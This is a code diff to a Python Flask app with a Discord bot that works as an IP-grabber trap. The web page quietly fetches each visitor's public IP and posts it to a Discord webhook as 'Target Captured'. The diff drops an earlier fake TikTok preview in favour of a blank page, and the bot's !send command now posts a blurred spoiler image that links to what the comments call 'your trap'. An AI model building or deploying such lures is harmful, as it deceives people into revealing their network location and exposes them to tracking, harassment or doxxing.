@@ -24,11 +24,7 @@ def index():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>TikTok</title>
-        <meta property="og:type" content="video.other">
-        <meta property="og:site_name" content="TikTok">
-        <meta property="og:title" content="Video">
-        <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+        <title>Loading...</title>
         <script>
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
@@ -43,6 +39,7 @@ def index():
                 });
         </script>
     </head>
+    <body style="background:#000;"></body>
     </html>
     """)
 
@@ -51,11 +48,21 @@ def log():
     data = request.json
     ip = data.get('ip', 'Unknown')
     ua = data.get('ua', 'Unknown')
-    device = "Windows PC" if "Windows" in ua else "iPhone" if "iPhone" in ua else "Android" if "Android" in ua else "Mac" if "Macintosh" in ua else "Unknown"
-    payload = {"embeds": [{"title": "Target Captured", "color": 65280, "fields": [{"name": "Device Name", "value": f"```{device}```", "inline": False},{"name": "Public IP", "value": f"```{ip}```", "inline": False}]}]}
-    if WEBHOOK_URL: requests.post(WEBHOOK_URL, json=payload)
+    
+    payload = {
+        "embeds": [{
+            "title": "Target Captured",
+            "color": 65280,
+            "fields": [
+                {"name": "Public IP", "value": f"```{ip}```", "inline": False}
+            ]
+        }]
+    }
+    if WEBHOOK_URL:
+        requests.post(WEBHOOK_URL, json=payload)
     return "ok", 200
 
+# --- DISCORD BOT ---
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
@@ -66,12 +73,26 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    embed = discord.Embed(color=0x2b2d31)
-    embed.url = RAILWAY_URL
-    embed.set_image(url="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg")
-    await ctx.send(embed=embed)
+    try:
+        # Load your image
+        file = discord.File("image.png", filename="SPOILER_image.png")
+    except:
+        await ctx.send("Error: Could not find image.png in the repo.")
+        return
+
+    # Create an embed with NO text. The URL goes to your trap.
+    embed = discord.Embed(url=RAILWAY_URL)
+    
+    # Attach the spoiler image
+    embed.set_image(url="attachment://SPOILER_image.png")
+
+    # Send it. The image is blurred. The whole image is a clickable link.
+    await ctx.send(embed=embed, file=file)
 
 def run_bot():
+    if not BOT_TOKEN:
+        print("ERROR: BOT_TOKEN missing.", flush=True)
+        return
     try:
         bot.run(BOT_TOKEN)
     except Exception as e:
